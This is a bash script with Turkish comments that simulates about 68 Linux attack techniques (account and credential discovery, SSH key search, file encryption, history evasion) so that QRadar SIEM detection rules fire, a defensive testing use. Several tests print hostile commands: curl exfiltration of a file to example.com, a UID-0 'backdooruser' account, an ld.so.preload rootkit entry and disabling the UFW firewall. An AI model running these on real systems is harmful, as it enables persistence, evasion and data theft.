#!/bin/bash
#############################################################################
# QRadar Korelasyon Kuralları Test Script
# Versiyon: 1.0
# Tarih: 2025-01-29
# Açıklama: 68 QRadar korelasyon kuralını test eden komple script
#############################################################################

# Renk kodları
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global değişkenler
LOG_FILE="/tmp/qradar_test_$(date +%Y%m%d_%H%M%S).log"
TEMP_DIR="/tmp/qradar_test_$$"
TEST_USER="qradar_test_user_$$"
SUMMARY_PASS=0
SUMMARY_FAIL=0
SUMMARY_SKIP=0

# Temizlik fonksiyonu
cleanup() {
    echo -e "\n${YELLOW}[*] Temizlik yapılıyor...${NC}"
    rm -rf $TEMP_DIR 2>/dev/null
    rm -f /tmp/test_* 2>/dev/null
    rm -f /tmp/*.test 2>/dev/null
    rm -f /tmp/qradar_test_* 2>/dev/null
}

# Çıkış trap'i
trap cleanup EXIT

# Log fonksiyonu
log_message() {
    local message="$1"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$LOG_FILE"
}

# Test fonksiyonu
run_test() {
    local rule_id="$1"
    local rule_name="$2"
    local test_command="$3"
    local requires_root="$4"
    local is_dangerous="$5"
    
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${YELLOW}[TEST]${NC} ${PURPLE}$rule_id${NC} - $rule_name"
    
    log_message "Testing $rule_id - $rule_name"
    
    # Root kontrolü
    if [[ "$requires_root" == "yes" ]] && [[ $EUID -ne 0 ]]; then
        echo -e "${RED}[SKIP]${NC} Root yetkisi gerekiyor"
        log_message "SKIP: $rule_id - Requires root"
        ((SUMMARY_SKIP++))
        return
    fi
    
    # Tehlikeli komut uyarısı
    if [[ "$is_dangerous" == "yes" ]]; then
        echo -e "${RED}[UYARI]${NC} Bu test sistem ayarlarını değiştirebilir!"
        echo -e "${YELLOW}Komut:${NC} $test_command"
        echo -n "Devam etmek istiyor musunuz? (e/h): "
        read -r response
        if [[ ! "$response" =~ ^[Ee]$ ]]; then
            echo -e "${YELLOW}[SKIP]${NC} Kullanıcı tarafından atlandı"
            log_message "SKIP: $rule_id - User skipped dangerous command"
            ((SUMMARY_SKIP++))
            return
        fi
    fi
    
    # Test komutunu çalıştır
    echo -e "${BLUE}[ÇALIŞTIRILIYOR]${NC} Test komutu..."
    log_message "Executing: $test_command"
    
    # Komut çıktısını yakala
    output=$(eval "$test_command" 2>&1)
    exit_code=$?
    
    if [ $exit_code -eq 0 ]; then
        echo -e "${GREEN}[BAŞARILI]${NC} Test tamamlandı"
        log_message "PASS: $rule_id"
        ((SUMMARY_PASS++))
        
        # Çıktının ilk birkaç satırını göster
        if [ -n "$output" ]; then
            echo -e "${CYAN}Çıktı:${NC}"
            echo "$output" | head -5
            if [ $(echo "$output" | wc -l) -gt 5 ]; then
                echo "... (daha fazla satır log dosyasında)"
            fi
        fi
    else
        echo -e "${RED}[BAŞARISIZ]${NC} Test başarısız (exit code: $exit_code)"
        log_message "FAIL: $rule_id - Exit code: $exit_code"
        ((SUMMARY_FAIL++))
        
        # Hata mesajını göster
        if [ -n "$output" ]; then
            echo -e "${RED}Hata:${NC}"
            echo "$output" | head -5
        fi
    fi
    
    # Log'a tam çıktıyı yaz
    echo "=== Output for $rule_id ===" >> "$LOG_FILE"
    echo "$output" >> "$LOG_FILE"
    echo "=== End of output ===" >> "$LOG_FILE"
}

# Başlangıç
clear
echo -e "${PURPLE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║        QRadar Korelasyon Kuralları Test Script'i           ║${NC}"
echo -e "${PURPLE}║                    Versiyon 1.0                            ║${NC}"
echo -e "${PURPLE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}[!] DİKKAT:${NC} Bu script test amaçlıdır."
echo -e "${YELLOW}[!]${NC} Bazı testler sistem ayarlarını değiştirebilir."
echo -e "${YELLOW}[!]${NC} Üretim ortamında kullanmayın!"
echo ""
echo -e "${CYAN}[*]${NC} Log dosyası: $LOG_FILE"
echo -e "${CYAN}[*]${NC} Geçici dizin: $TEMP_DIR"
echo ""

# Geçici dizin oluştur
mkdir -p $TEMP_DIR

# Devam onayı
echo -n "Testlere başlamak istiyor musunuz? (e/h): "
read -r response
if [[ ! "$response" =~ ^[Ee]$ ]]; then
    echo -e "${RED}Test iptal edildi.${NC}"
    exit 0
fi

echo -e "\n${GREEN}[*] Testler başlatılıyor...${NC}"
log_message "Test session started"

#############################################################################
# TESTLER
#############################################################################

# DT0504 - Encrypt files using openssl
run_test "DT0504" "Encrypt files using openssl" \
"echo 'test data' > $TEMP_DIR/test_file.txt && \
openssl rand -out $TEMP_DIR/test.key 32 && \
openssl enc -aes-256-cbc -salt -in $TEMP_DIR/test_file.txt -out $TEMP_DIR/test_file.enc -pass file:$TEMP_DIR/test.key && \
ls -la $TEMP_DIR/test_file.enc" \
"no" "no"

# DT0503 - Encrypt files using 7z
run_test "DT0503" "Encrypt files using 7z" \
"echo 'sensitive data' > $TEMP_DIR/test_data.txt && \
7z a -p'testpassword123' $TEMP_DIR/test_archive.7z $TEMP_DIR/test_data.txt >/dev/null 2>&1 && \
ls -la $TEMP_DIR/test_archive.7z" \
"no" "no"

# DT0548 - Load Kernel Module via insmod
run_test "DT0548" "Load Kernel Module via insmod" \
"echo 'insmod /lib/modules/test.ko' && \
lsmod | grep -E '^Module|^ext4' | head -2" \
"no" "no"

# DT0547 - Cron - Add script to /var/spool/cron/crontabs/ folder
run_test "DT0547" "Cron - Add script to crontabs folder" \
"username=\$(id -u -n) && \
echo \"Testing user: \$username\" && \
lsof -u \$username 2>/dev/null | grep -i cron | head -5" \
"no" "no"

# DT0546 - Cron - Add script to cron subfolders
run_test "DT0546" "Cron - Add script to cron subfolders" \
"echo '#!/bin/bash' > $TEMP_DIR/test_cron.sh && \
echo 'echo test' >> $TEMP_DIR/test_cron.sh && \
chmod +x $TEMP_DIR/test_cron.sh && \
echo 'Would write to: /etc/cron.daily/test_script' && \
ls -la /etc/cron.daily/ 2>/dev/null | head -5" \
"no" "no"

# DT0564 - Linux - Add User to Group
run_test "DT0564" "Linux - Add User to Group" \
"echo 'Event-based rule - simulating: usermod -a -G testgroup testuser' && \
groups \$(whoami)" \
"no" "no"

# DT0530 - Create a New User in Linux with UID and GID
run_test "DT0530" "Create a New User with UID/GID 0" \
"echo 'DANGEROUS: useradd -g 0 -M -d /root -s /bin/bash backdooruser' && \
echo 'Simulation only - not executing'" \
"no" "no"

# DT0531 - Enumerate All Accounts (Local)
run_test "DT0531" "Enumerate All Accounts (Local)" \
"cat /etc/passwd > $TEMP_DIR/accounts_list.txt && \
wc -l $TEMP_DIR/accounts_list.txt && \
head -5 $TEMP_DIR/accounts_list.txt" \
"no" "no"

# DT0532 - View Sudoers Access
run_test "DT0532" "View Sudoers Access" \
"if [ -r /etc/sudoers ]; then \
    cat /etc/sudoers > $TEMP_DIR/sudoers_backup.txt 2>/dev/null && \
    echo 'Sudoers file copied'; \
else \
    cat /usr/local/etc/sudoers > $TEMP_DIR/sudoers_backup.txt 2>/dev/null || \
    echo 'Cannot read sudoers file'; \
fi" \
"no" "no"

# DT0501 - psexec.py (Impacket)
run_test "DT0501" "psexec.py (Impacket)" \
"echo 'psexec.py domain/user:password@target' && \
which psexec.py 2>/dev/null || echo 'psexec.py not found in PATH'" \
"no" "no"

# DT0560 - Exfiltrate Data via HTTPS Using curl
run_test "DT0560" "Exfiltrate Data via HTTPS Using curl" \
"echo 'test data' > $TEMP_DIR/exfil_test.txt && \
echo 'Simulating: curl -X POST https://example.com/upload?maxDownloads=1&autoDelete=true -F file=@$TEMP_DIR/exfil_test.txt' && \
curl --version | head -1" \
"no" "no"

# DT0559 - Full path of the library to add to ld.so.preload
run_test "DT0559" "LD_PRELOAD manipulation" \
"echo '/tmp/malicious.so' > $TEMP_DIR/ld.so.preload.test && \
echo 'Would execute: tee -a /etc/ld.so.preload' && \
cat $TEMP_DIR/ld.so.preload.test" \
"no" "no"

# DT0543 - Decode base64 Data into Script
run_test "DT0543" "Decode base64 Data into Script" \
"echo 'IyEvYmluL2Jhc2gKZWNobyAidGVzdCI=' | base64 -d > $TEMP_DIR/decoded_script.sh && \
cat $TEMP_DIR/decoded_script.sh && \
chmod +x $TEMP_DIR/decoded_script.sh && \
file $TEMP_DIR/decoded_script.sh" \
"no" "no"

# DT0525 - Examine Password Complexity Policy - CentOS/RHEL
run_test "DT0525" "Password Complexity Policy - CentOS/RHEL" \
"if [ -f /etc/security/pwquality.conf ]; then \
    cat /etc/security/pwquality.conf | grep -v '^#' | grep -v '^$' | head -10; \
else \
    echo 'pwquality.conf not found (not CentOS/RHEL system)'; \
fi" \
"no" "no"

# DT0562 - Discover System Language by locale File
run_test "DT0562" "Discover System Language by locale File" \
"if [ -f /etc/locale.conf ]; then \
    cat /etc/locale.conf; \
elif [ -f /etc/default/locale ]; then \
    cat /etc/default/locale; \
else \
    echo 'Locale file not found'; \
fi" \
"no" "no"

# DT0561 - Pad Binary to Change Hash - dd
run_test "DT0561" "Pad Binary to Change Hash" \
"cp /bin/echo $TEMP_DIR/test_binary && \
original_hash=\$(md5sum $TEMP_DIR/test_binary | cut -d' ' -f1) && \
dd if=/dev/zero bs=1 count=100 >> $TEMP_DIR/test_binary 2>/dev/null && \
new_hash=\$(md5sum $TEMP_DIR/test_binary | cut -d' ' -f1) && \
echo \"Original hash: \$original_hash\" && \
echo \"New hash: \$new_hash\"" \
"no" "no"

# DT0502 - Encrypt files using gpg
run_test "DT0502" "Encrypt files using gpg" \
"echo 'test data' > $TEMP_DIR/test_gpg.txt && \
echo 'password123' | gpg --batch --yes --passphrase-fd 0 -c $TEMP_DIR/test_gpg.txt 2>/dev/null && \
ls -la $TEMP_DIR/test_gpg.txt.gpg 2>/dev/null || echo 'GPG encryption failed or GPG not installed'" \
"no" "no"

# DT0527 - Examine Password Expiration Policy
run_test "DT0527" "Password Expiration Policy" \
"cat /etc/login.defs | grep -E 'PASS_MAX_DAYS|PASS_MIN_DAYS|PASS_WARN_AGE' | grep -v '^#'" \
"no" "no"

# DT0545 - Show if a User Account has Ever Logged in Remotely
run_test "DT0545" "Remote Login History" \
"lastlog | head -10 || echo 'lastlog command not available'" \
"no" "no"

# DT0526 - Examine Password Complexity Policy - CentOS/RHEL 2
run_test "DT0526" "PAM Password Policy - CentOS/RHEL" \
"if [ -f /etc/pam.d/system-auth ]; then \
    cat /etc/pam.d/system-auth | grep -i password | head -5; \
else \
    echo 'system-auth not found (not CentOS/RHEL system)'; \
fi" \
"no" "no"

# DT0544 - List opened files by user
run_test "DT0544" "List opened files by user" \
"username=\$(id -u -n) && \
echo \"Checking open files for user: \$username\" && \
lsof -u \$username 2>/dev/null | head -10 || echo 'lsof command failed'" \
"no" "no"

# DT0563 - Discover System Language with localectl
run_test "DT0563" "System Language with localectl" \
"localectl status 2>/dev/null || echo 'localectl not available on this system'" \
"no" "no"

# DT0529 - Create a User Account on a Linux System
run_test "DT0529" "Create User Account Event" \
"echo 'Event-based rule - would trigger on useradd command' && \
echo 'Current users:' && \
cut -d: -f1 /etc/passwd | tail -5" \
"no" "no"

# DT0528 - Network Share Discovery - Linux
run_test "DT0528" "Network Share Discovery" \
"smbstatus --shares 2>/dev/null || \
smbclient -L localhost -N 2>/dev/null | head -10 || \
echo 'Samba tools not installed or not running'" \
"no" "no"

# DT0508 - System Service Discovery - systemctl
run_test "DT0508" "System Service Discovery" \
"systemctl --type=service --state=running 2>/dev/null | head -10 || \
service --status-all 2>/dev/null | head -10 || \
echo 'Service discovery command not available'" \
"no" "no"

# DT0507 - Search Through Bash History
run_test "DT0507" "Search Through Bash History" \
"if [ -f ~/.bash_history ]; then \
    cat ~/.bash_history | grep -i 'password\\|passwd\\|ssh' | head -5 || \
    echo 'No password-related entries found'; \
else \
    echo 'Bash history file not found'; \
fi" \
"no" "no"

# DT0557 - List OS Information
run_test "DT0557" "List OS Information" \
"uname -a && \
echo '---' && \
cat /etc/os-release 2>/dev/null | head -5 || \
cat /etc/issue 2>/dev/null || \
echo 'OS release info not found'" \
"no" "no"

# DT0511 - Disable History Collection
run_test "DT0511" "Disable History Collection" \
"export HISTCONTROL=ignoreboth && \
echo 'HISTCONTROL set to: ignoreboth' && \
echo \$HISTCONTROL" \
"no" "no"

# DT0510 - Overwrite file with DD
run_test "DT0510" "Overwrite file with DD" \
"echo 'test log data' > $TEMP_DIR/test.log && \
dd if=/dev/zero of=$TEMP_DIR/test.log bs=1024 count=1 2>/dev/null && \
echo 'File overwritten, new size:' && \
ls -la $TEMP_DIR/test.log" \
"no" "no"

# DT0512 - Browser Bookmark Discovery
run_test "DT0512" "Browser Bookmark Discovery" \
"find ~/.mozilla -name 'places.sqlite' 2>/dev/null | head -5 || \
find ~/.config -name 'Bookmarks' 2>/dev/null | head -5 || \
echo 'No browser bookmark files found'" \
"no" "no"

# DT0509 - Permission Groups Discovery (Local)
run_test "DT0509" "Permission Groups Discovery" \
"cat /etc/group | grep -E 'sudo|admin|wheel|root' | head -10" \
"no" "no"

# DT0558 - Linux VM Check via Hardware
run_test "DT0558" "VM Detection via Hardware" \
"echo 'Checking VM indicators:' && \
cat /sys/class/dmi/id/product_name 2>/dev/null || echo 'DMI product name not accessible' && \
cat /proc/scsi/scsi 2>/dev/null | grep -i 'vmware\\|virtual' | head -5 || \
echo 'No VM indicators in SCSI devices'" \
"no" "no"

# DT0540 - Edit UFW Firewall ufw.conf File
run_test "DT0540" "UFW Config Manipulation" \
"echo 'ENABLED=no' >> $TEMP_DIR/ufw.conf.test && \
echo 'Test content written to temp file:' && \
cat $TEMP_DIR/ufw.conf.test" \
"no" "no"

# DT0539 - UFW Firewall user.rules File
run_test "DT0539" "UFW User Rules Manipulation" \
"echo '### RULES ###' >> $TEMP_DIR/user.rules.test && \
echo '-A ufw-user-input -p tcp --dport 22 -j ACCEPT' >> $TEMP_DIR/user.rules.test && \
cat $TEMP_DIR/user.rules.test" \
"no" "no"

# DT0542 - Edit UFW Firewall Main Configuration File
run_test "DT0542" "UFW Default Config Manipulation" \
"echo 'DEFAULT_FORWARD_POLICY=\"ACCEPT\"' >> $TEMP_DIR/ufw.default.test && \
cat $TEMP_DIR/ufw.default.test" \
"no" "no"

# DT0541 - Edit UFW Firewall sysctl.conf File
run_test "DT0541" "UFW Sysctl Manipulation" \
"echo 'net.ipv4.ip_forward=1' >> $TEMP_DIR/sysctl.conf.test && \
cat $TEMP_DIR/sysctl.conf.test" \
"no" "no"

# DT0565 - Linux - Remove User From Group
run_test "DT0565" "Remove User From Group Event" \
"echo 'Event-based rule - would trigger on gpasswd -d user group' && \
groups \$(whoami)" \
"no" "no"

# DT0550 - Python http.server module usage
run_test "DT0550" "Python HTTP Server" \
"timeout 2 python3 -m http.server 8888 >/dev/null 2>&1 & \
pid=\$! && \
sleep 0.5 && \
ps aux | grep -v grep | grep 'python3 -m http.server' || echo 'Python HTTP server test completed' && \
kill \$pid 2>/dev/null" \
"no" "no"

# DT0505 - Encrypt files using ccrypt
run_test "DT0505" "Encrypt files using ccrypt" \
"which ccrypt >/dev/null 2>&1 && \
echo 'test data' > $TEMP_DIR/test_ccrypt.txt && \
echo 'ccrypt installed - would encrypt with: ccrypt $TEMP_DIR/test_ccrypt.txt' || \
echo 'ccrypt not installed on this system'" \
"no" "no"

# DT0549 - Linux List Kernel Modules (AKTİF KURAL)
run_test "DT0549" "Linux List Kernel Modules (ACTIVE RULE)" \
"echo '=== ACTIVE RULE TEST ===' && \
lsmod | head -10 && \
echo '---' && \
grep -E 'vmw|vbox|kvm' /proc/modules 2>/dev/null | head -5 || \
echo 'No virtualization modules found'" \
"no" "no"

# DT0567 - Linux - Delete User Account
run_test "DT0567" "Delete User Account Event" \
"echo 'Event-based rule - would trigger on userdel command' && \
echo 'Total users on system:' && \
wc -l /etc/passwd" \
"no" "no"

# DT0534 - disable/enable UFW Firewall
run_test "DT0534" "UFW Disable/Enable" \
"echo 'DANGEROUS: ufw disable' && \
ufw status 2>/dev/null | head -5 || echo 'UFW not installed'" \
"no" "no"

# DT0552 - Remote System Discovery - ip neighbour
run_test "DT0552" "Remote System Discovery - ip neighbour" \
"ip neighbour show 2>/dev/null | head -10 || \
ip neigh show 2>/dev/null | head -10 || \
echo 'ip command not available'" \
"no" "no"

# DT0566 - Linux User Privilege Escalation
run_test "DT0566" "User Privilege Escalation to sudo" \
"echo 'Event-based rule - would trigger on adding user to sudo group' && \
getent group sudo 2>/dev/null || getent group wheel 2>/dev/null || \
echo 'sudo/wheel group not found'" \
"no" "no"

# DT0533 - View Accounts with UID 0
run_test "DT0533" "View Accounts with UID 0" \
"grep 'x:0:' /etc/passwd > $TEMP_DIR/root_accounts.txt && \
echo 'Root accounts found:' && \
cat $TEMP_DIR/root_accounts.txt" \
"no" "no"

# DT0551 - Remote System Discovery - arp
run_test "DT0551" "Remote System Discovery - arp" \
"arp -a 2>/dev/null | head -10 || \
ip neigh show 2>/dev/null | head -10 || \
echo 'ARP command not available'" \
"no" "no"

# DT0536 - Turn off UFW Logging
run_test "DT0536" "Turn off UFW Logging" \
"echo 'DANGEROUS: ufw logging off' && \
echo 'Current UFW status:' && \
ufw status verbose 2>/dev/null | grep -i logging || \
echo 'UFW not installed or not accessible'" \
"no" "no"

# DT0554 - Remote System Discovery - ip tcp_metrics
run_test "DT0554" "Remote System Discovery - tcp_metrics" \
"ip tcp_metrics show 2>/dev/null | head -10 || \
echo 'TCP metrics not available (requires root or not supported)'" \
"no" "no"

# DT0535 - Stop/Start UFW Firewall Systemctl
run_test "DT0535" "UFW Service Manipulation" \
"echo 'DANGEROUS: systemctl stop ufw' && \
systemctl status ufw 2>/dev/null | head -5 || \
service ufw status 2>/dev/null | head -5 || \
echo 'UFW service not found'" \
"no" "no"

# DT0553 - Remote System Discovery - ip route
run_test "DT0553" "Network Discovery via Routing Table" \
"ip route show 2>/dev/null | head -10 || \
route -n 2>/dev/null | head -10 || \
echo 'Routing table commands not available'" \
"no" "no"

# DT0506 - Discover Private SSH Keys
run_test "DT0506" "SSH Private Key Discovery" \
"find ~ -maxdepth 3 -name 'id_rsa' -o -name 'id_dsa' -o -name 'id_ecdsa' -o -name 'id_ed25519' 2>/dev/null | \
while read keyfile; do \
    echo \"Found: \$keyfile\" && \
    ls -la \"\$keyfile\" 2>/dev/null; \
done | head -10 || echo 'No SSH keys found in home directory'" \
"no" "no"

# DT0556 - Add or copy content to clipboard with xClip
run_test "DT0556" "Clipboard Manipulation with xclip" \
"which xclip >/dev/null 2>&1 && \
echo 'test clipboard data' | xclip -sel clip 2>/dev/null && \
echo 'Data copied to clipboard' || \
echo 'xclip not installed'" \
"no" "no"

# DT0538 - Modify SSH Authorized Keys
run_test "DT0538" "SSH Authorized Keys Manipulation" \
"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAgQC test@test' > $TEMP_DIR/authorized_keys.test && \
echo 'Test SSH key written to:' && \
cat $TEMP_DIR/authorized_keys.test" \
"no" "no"

# DT0555 - Suspicious Loadable Kernel Module
run_test "DT0555" "Kernel Module Loading with modprobe" \
"modprobe --show-depends ext4 2>/dev/null | head -5 || \
echo 'modprobe test completed'" \
"no" "no"

# DT0537 - Tail the UFW Firewall Log File
run_test "DT0537" "UFW Log Monitoring" \
"if [ -f /var/log/ufw.log ]; then \
    tail -n 5 /var/log/ufw.log 2>/dev/null || echo 'Cannot read UFW log'; \
else \
    echo 'UFW log file not found'; \
fi" \
"no" "no"

# DT0514 - Malicious User Agents
run_test "DT0514" "Custom User Agent with curl" \
"curl -s -A 'Mozilla/5.0 (Evil Bot)' http://httpbin.org/user-agent 2>/dev/null | \
grep -i 'evil' || echo 'User agent test completed'" \
"no" "no"

# DT0513 - Tor Proxy Usage - Systemctl
run_test "DT0513" "Tor Service Activation" \
"echo 'DANGEROUS: systemctl start tor' && \
systemctl is-active tor 2>/dev/null || \
echo 'Tor service not installed'" \
"no" "no"

# DT0515 - Exfiltrate Data HTTPS Using curl
run_test "DT0515" "Data Exfiltration with curl -F" \
"echo 'sensitive data' > $TEMP_DIR/exfil.txt && \
echo 'Would execute: curl -F file=@$TEMP_DIR/exfil.txt https://example.com?maxDownloads=1&autoDelete=true' && \
ls -la $TEMP_DIR/exfil.txt" \
"no" "no"

# DT0500 - System Owner/User Discovery
run_test "DT0500" "System Owner/User Discovery" \
"echo 'Currently logged in users:' && \
users && \
echo '---' && \
who" \
"no" "no"

# DT0520 - Process Discovery - ps
run_test "DT0520" "Process Discovery" \
"ps aux | head -10 && \
echo '---' && \
echo 'Total processes:' && \
ps aux | wc -l" \
"no" "no"

# DT0519 - Add or Copy Content to Clipboard with xClip
run_test "DT0519" "Clipboard Data Collection" \
"which xclip >/dev/null 2>&1 && \
echo 'captured sensitive data' | xclip -sel clip 2>/dev/null && \
echo 'Clipboard test completed' || \
echo 'xclip not available'" \
"no" "no"

# DT0522 - Go Compile
run_test "DT0522" "Go Compilation" \
"which go >/dev/null 2>&1 && \
echo 'package main; import \"fmt\"; func main() { fmt.Println(\"Hello QRadar\") }' > $TEMP_DIR/test.go && \
go run $TEMP_DIR/test.go 2>/dev/null || \
echo 'Go not installed on this system'" \
"no" "no"

# DT0521 - Linux Using tshark or tcpdump
run_test "DT0521" "Network Sniffing Tools" \
"echo 'Checking for packet capture tools:' && \
which tcpdump >/dev/null 2>&1 && echo 'tcpdump: installed' || echo 'tcpdump: not found' && \
which tshark >/dev/null 2>&1 && echo 'tshark: installed' || echo 'tshark: not found' && \
echo 'Would require root to actually capture packets'" \
"no" "no"

# DT0524 - Examine Password Complexity Policy - Ubuntu
run_test "DT0524" "Ubuntu Password Policy Discovery" \
"if [ -f /etc/pam.d/common-password ]; then \
    cat /etc/pam.d/common-password | grep -v '^#' | grep -i password | head -10; \
else \
    echo 'common-password not found (not Ubuntu/Debian system)'; \
fi" \
"no" "no"

# DT0523 - Sudo Usage
run_test "DT0523" "Sudo Usage Detection" \
"sudo -n -l 2>/dev/null || \
echo 'sudo test completed (no passwordless sudo available)'" \
"no" "no"

# DT0516 - Masquerading as Linux crond process
run_test "DT0516" "Process Masquerading as crond" \
"echo 'Testing process masquerading detection' && \
ps aux | grep -i cron | grep -v grep | head -5" \
"no" "no"

# DT0517 - Do Reconnaissance for Files that Have the Setuid Bit Set
run_test "DT0517" "SUID Bit Reconnaissance" \
"find /usr/bin -perm -4000 -type f 2>/dev/null | head -10 || \
echo 'SUID file search completed'" \
"no" "no"

# DT0518 - Extract Passwords with grep
run_test "DT0518" "Password Extraction with grep" \
"echo 'password=secret123' > $TEMP_DIR/config.txt && \
echo 'db_password=\"test\"' >> $TEMP_DIR/config.txt && \
grep -ri 'password' $TEMP_DIR 2>/dev/null | head -5" \
"no" "no"

#############################################################################
# ÖZET RAPORU
#############################################################################

echo -e "\n\n${PURPLE}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${PURPLE}║                      TEST ÖZETİ                            ║${NC}"
echo -e "${PURPLE}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${GREEN}Başarılı:${NC} $SUMMARY_PASS"
echo -e "${RED}Başarısız:${NC} $SUMMARY_FAIL"
echo -e "${YELLOW}Atlanan:${NC} $SUMMARY_SKIP"
echo -e "${CYAN}Toplam:${NC} $((SUMMARY_PASS + SUMMARY_FAIL + SUMMARY_SKIP))"
echo ""
echo -e "${BLUE}Log dosyası:${NC} $LOG_FILE"
echo ""

# En riskli kuralları listele
echo -e "${RED}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                  EN KRİTİK KURALLAR                        ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${YELLOW}Privilege Escalation:${NC}"
echo "  - DT0530: Root yetkili kullanıcı oluşturma"
echo "  - DT0533: UID 0 olan hesapları görüntüleme"
echo "  - DT0566: Sudo grubuna kullanıcı ekleme"
echo ""
echo -e "${YELLOW}Persistence/Rootkit:${NC}"
echo "  - DT0559: LD_PRELOAD manipülasyonu"
echo "  - DT0548: Kernel modülü yükleme"
echo "  - DT0555: Şüpheli kernel modülleri"
echo ""
echo -e "${YELLOW}Data Encryption/Ransomware:${NC}"
echo "  - DT0501-DT0505: Çeşitli şifreleme araçları"
echo ""
echo -e "${YELLOW}Data Exfiltration:${NC}"
echo "  - DT0560, DT0515: HTTPS üzerinden veri sızdırma"
echo ""

# Test bitiş mesajı
echo -e "\n${GREEN}[✓] Test tamamlandı!${NC}"
echo -e "${YELLOW}[!] Detaylı sonuçlar için log dosyasını inceleyin.${NC}"

# Log dosyasının son satırlarını göster
echo -e "\n${CYAN}Log dosyasının son 10 satırı:${NC}"
tail -10 "$LOG_FILE"

# Temizlik onayı
echo -e "\n${YELLOW}Geçici dosyaları temizlemek ister misiniz? (e/h):${NC} "
read -r cleanup_response
if [[ "$cleanup_response" =~ ^[Ee]$ ]]; then
    cleanup
    echo -e "${GREEN}[✓] Temizlik tamamlandı.${NC}"
else
    echo -e "${YELLOW}[!] Geçici dosyalar korundu: $TEMP_DIR${NC}"
fi

echo -e "\n${PURPLE}Script tamamlandı. QRadar SOC ekibinize başarılar!${NC}\n"

# Log dosyasına özet yaz
{
    echo ""
    echo "=== TEST SUMMARY ==="
    echo "Date: $(date)"
    echo "Passed: $SUMMARY_PASS"
    echo "Failed: $SUMMARY_FAIL"
    echo "Skipped: $SUMMARY_SKIP"
    echo "Total: $((SUMMARY_PASS + SUMMARY_FAIL + SUMMARY_SKIP))"
    echo "=== END OF TEST ==="
} >> "$LOG_FILE"

exit 0
